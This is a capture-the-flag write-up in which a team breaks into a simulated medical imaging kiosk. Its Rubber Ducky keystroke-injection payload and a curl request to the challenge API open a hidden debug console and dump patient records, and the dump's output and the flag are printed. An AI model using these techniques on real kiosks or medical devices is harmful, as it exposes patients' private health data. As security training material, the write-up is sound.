---
title: Dump It
tags:
  - DEADFACE CTF 2026
  - Medical Device
---

# Dump It

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Medical Device |
| **Points** | 150 |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

The ScanWorks kiosk is supposed to be locked to the touchscreen, but it's really just a browser in a box and it never stopped listening to the keyboard. A maintenance console is one key chord away, with a debug function that will dump data, if you tell it the right thing to dump.

## Solution

### The Rubber Ducky

Plug the Rubber Ducky into USB-A. Its frontend module (`/assets/hidMacro-CuHggWtU.js`) has a payload template that shows the key chord but leaves the command blank:

```
REM Rubber Ducky payload — target: ScanWorks kiosk
DELAY 500
CTRL-ALT F12
DELAY 300
STRING <function>(<table>)
ENTER
```

`CTRL-ALT F12` opens a console that says `ScanWorks debug console (NeuraOS 2.3.1)`. We tried guessing first. `help()` and `dump(patients)` both give `unknown function`, and a bare word gives `syntax error (expected function(arg))`.

### The real names

They're on the device's disk, so you need [Live Boot](live-boot.md) done first. `/mnt/opt/scanworks/config.yaml` has:

```yaml
debug_console:
  enabled: true
  function: debug.dump
  tables: [patients, calibration, audit]
```

`scanworks.log` (`WARN scanworks: debug_console enabled (function=debug.dump)`) and `strings scanworks.bin` both agree on `debug.dump`.

### Dumping patients

```bash
curl -s -X POST http://emedra.dctf.io:8080/api/kiosk/hid \
  -H 'content-type: application/json' \
  -d '{"token":"<TOKEN>","macro":"DELAY 500\nCTRL-ALT F12\nDELAY 300\nSTRING debug.dump(patients)\nENTER"}'
```

```
> debug.dump(patients)
[100413] Gideon Marsh  | study: Cranial perfusion, contrast
[100666] Lenora Crane  | study: Baseline screen
[100228] Osric Vane    | study: Post-op follow-up
debug-token: deadface{un10ck3d_k10sk_qu4cks_b4ck}
```

The other two tables have no flag. `calibration` prints the current thresholds and `audit` says `log empty`.

## Flag

!!! flag "Flag"
    `deadface{un10ck3d_k10sk_qu4cks_b4ck}`

## Takeaways

Hiding the mouse doesn't lock down a kiosk. A USB keyboard injector types whatever you tell it. And when a console wants an exact function name, stop guessing and go read the config.
